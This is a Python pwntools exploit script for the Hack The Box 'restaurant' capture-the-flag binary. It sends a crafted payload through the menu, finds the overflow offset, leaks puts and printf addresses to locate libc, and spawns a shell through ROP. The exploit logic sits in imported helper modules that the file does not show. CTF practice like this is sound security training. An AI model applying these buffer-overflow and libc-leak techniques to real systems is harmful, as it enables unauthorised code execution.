import pathlib

from core.gdb_wrapper import GdbApi, GdbWrapper
from core.target_config import Config, Mode
from core.targetbase import TargetBase
from modules.find_offset import FindOffset
from modules.get_libc_address import GetLibcAddress
from modules.exec_shell import ExecShell
from loguru import logger
from pwnlib.tubes.process import process
from abstract.pwntarget import PwnTarget


class RestaurantPwn(PwnTarget):
    @classmethod
    def main(cls, proc: process, payload: bytes, *args, **kwargs):
        cls.logger.info(proc.recvuntil(b">").decode() + "1")
        proc.sendline(b"1")
        cls.logger.info(proc.recvuntil(b">").decode())
        cls.logger.info(payload)
        proc.send_raw(payload)

    @classmethod
    def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
        pos = payload.find(b'\0')
        expected = b'Enjoy your '
        if pos >= 0:
            expected += payload[:pos]
        else:
            expected += payload
        proc.recvline()
        data = proc.recv(len(expected))
        if data != expected:
            logger.warning("Input handler: received and expected data mismatch")


if __name__ == '__main__':
    config = Config(
        rop=True,
        mode=Mode.local,
        file=pathlib.Path('/home/lim8en1/htb/projects-archive/restaurant/pwn_restaurant/restaurant'),
        offset=0x20,
        detect_libc=True
    )

    t = TargetBase(pwn_target=RestaurantPwn, config=config)
    FindOffset.execute(t, config.offset_max)
    puts_address = GetLibcAddress.execute(t, target_functions=['puts'])
    printf_address = GetLibcAddress.execute(t, target_functions=['printf'])
    GetLibcAddress.libc_update_base_address(t, [('puts', puts_address), ('printf', printf_address)])
    ExecShell.execute(t)
